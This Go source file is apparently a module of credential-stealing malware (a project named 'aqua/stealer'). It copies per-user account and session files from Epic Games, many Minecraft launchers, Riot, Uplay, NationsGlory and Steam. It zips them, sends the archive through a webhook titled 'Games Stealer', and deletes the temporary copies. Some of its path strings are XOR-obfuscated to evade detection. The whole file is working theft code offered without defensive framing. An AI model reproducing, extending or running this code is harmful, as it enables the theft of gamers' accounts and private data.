package games

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/aqua/stealer/utils/fileutil"
	"github.com/aqua/stealer/utils/hardware"
	"github.com/aqua/stealer/utils/requests"
)

func xs(b []byte) string {
	out := make([]byte, len(b))
	for i, v := range b {
		out[i] = v ^ 0x5A
	}
	return string(out)
}

func Run(wh *requests.DualWebhook) {
	// "EpicGamesLauncher" and path components XOR-decoded at runtime
	_egl := []byte{0x1f, 0x2a, 0x33, 0x39, 0x1d, 0x3b, 0x37, 0x3f, 0x29, 0x16, 0x3b, 0x2f, 0x34, 0x39, 0x32, 0x3f, 0x28}
	_saved := []byte{0x09, 0x3b, 0x2c, 0x3f, 0x3e}
	_config := []byte{0x19, 0x35, 0x34, 0x3c, 0x33, 0x3d}
	_windows := []byte{0x0d, 0x33, 0x34, 0x3e, 0x35, 0x2d, 0x29}
	_gus := []byte{0x1d, 0x3b, 0x37, 0x3f, 0x0f, 0x29, 0x3f, 0x28, 0x09, 0x3f, 0x2e, 0x2e, 0x33, 0x34, 0x3d, 0x29, 0x74, 0x33, 0x34, 0x33}

	for _, user := range hardware.GetUsers() {
		paths := map[string]map[string]string{
			"Epic Games": {
				"Settings": filepath.Join(user, "AppData", "Local", xs(_egl), xs(_saved), xs(_config), xs(_windows), xs(_gus)),
			},
			"Minecraft": {
				"Intent":          filepath.Join(user, "intentlauncher", "launcherconfig"),
				"Lunar":           filepath.Join(user, ".lunarclient", "settings", "game", "accounts.json"),
				"TLauncher":       filepath.Join(user, "AppData", "Roaming", ".minecraft", "TlauncherProfiles.json"),
				"Feather":         filepath.Join(user, "AppData", "Roaming", ".feather", "accounts.json"),
				"Meteor":          filepath.Join(user, "AppData", "Roaming", ".minecraft", "meteor-client", "accounts.nbt"),
				"Impact":          filepath.Join(user, "AppData", "Roaming", ".minecraft", "Impact", "alts.json"),
				"Novoline":        filepath.Join(user, "AppData", "Roaming", ".minecraft", "Novoline", "alts.novo"),
				"CheatBreakers":   filepath.Join(user, "AppData", "Roaming", ".minecraft", "cheatbreaker_accounts.json"),
				"Microsoft Store": filepath.Join(user, "AppData", "Roaming", ".minecraft", "launcher_accounts_microsoft_store.json"),
				"Rise":            filepath.Join(user, "AppData", "Roaming", ".minecraft", "Rise", "alts.txt"),
				"Rise (Intent)":   filepath.Join(user, "intentlauncher", "Rise", "alts.txt"),
				"Paladium":        filepath.Join(user, "AppData", "Roaming", "paladium-group", "accounts.json"),
				"PolyMC":          filepath.Join(user, "AppData", "Roaming", "PolyMC", "accounts.json"),
				"Badlion":         filepath.Join(user, "AppData", "Roaming", "Badlion Client", "accounts.json"),
			},
			"Riot Games": {
				"Config": filepath.Join(user, "AppData", "Local", "Riot Games", "Riot Client", "Config"),
				"Data":   filepath.Join(user, "AppData", "Local", "Riot Games", "Riot Client", "Data"),
				"Logs":   filepath.Join(user, "AppData", "Local", "Riot Games", "Riot Client", "Logs"),
			},
			"Uplay": {
				"Settings": filepath.Join(user, "AppData", "Local", "Ubisoft Game Launcher"),
			},
			"NationsGlory": {
				"Local Storage": filepath.Join(user, "AppData", "Roaming", "NationsGlory", "Local Storage", "leveldb"),
			},
		}

		tempDir := filepath.Join(os.TempDir(), fmt.Sprintf("games-%s", strings.Split(user, "\\")[2]))
		found := ""
		for name, path := range paths {
			dest := filepath.Join(tempDir, strings.Split(user, "\\")[2], name)

			if err := os.MkdirAll(dest, os.ModePerm); err != nil {
				continue
			}

			var err error

			for fName, fPath := range path {
				if filepath.Ext(fPath) != "" {
					os.MkdirAll(filepath.Join(dest, fName), os.ModePerm)
					err = fileutil.CopyFile(fPath, filepath.Join(dest, fName, filepath.Base(fPath)))
				} else {
					err = fileutil.CopyDir(fPath, filepath.Join(dest, fName))
				}

				if err != nil {
					continue
				}

				if !strings.Contains(found, name) {
					found += fmt.Sprintf("\n✅ %s ", name)
				}
			}
		}

		if found == "" {
			os.RemoveAll(tempDir)
			continue
		}

		tempZip := filepath.Join(os.TempDir(), "games.zip")

		if err := fileutil.Zip(tempDir, tempZip); err != nil {
			os.RemoveAll(tempDir)
			continue
		}

		wh.Send(map[string]interface{}{
			"embeds": []map[string]interface{}{
				{
					"title":       "Games Stealer - " + strings.Split(user, "\\")[2],
					"description": "```" + found + "```",
				},
			},
		}, tempZip)

		os.RemoveAll(tempDir)
		os.Remove(tempZip)
	}

	tempDir := fmt.Sprintf("%s\\%s", os.TempDir(), "steam-temp")
	defer os.RemoveAll(tempDir)

	path := "C:\\Program Files (x86)\\Steam\\config"
	if !fileutil.IsDir(path) {
		return
	}

	if err := fileutil.CopyDir(path, tempDir); err != nil {
		return
	}

	tempZip := filepath.Join(os.TempDir(), "steam.zip")
	if err := fileutil.Zip(tempDir, tempZip); err != nil {
		return
	}
	defer os.Remove(tempZip)

	wh.Send(map[string]interface{}{
		"embeds": []map[string]interface{}{
			{
				"title":       "Steam",
				"description": "`✅✅✅`",
			},
		},
	}, tempZip)
}
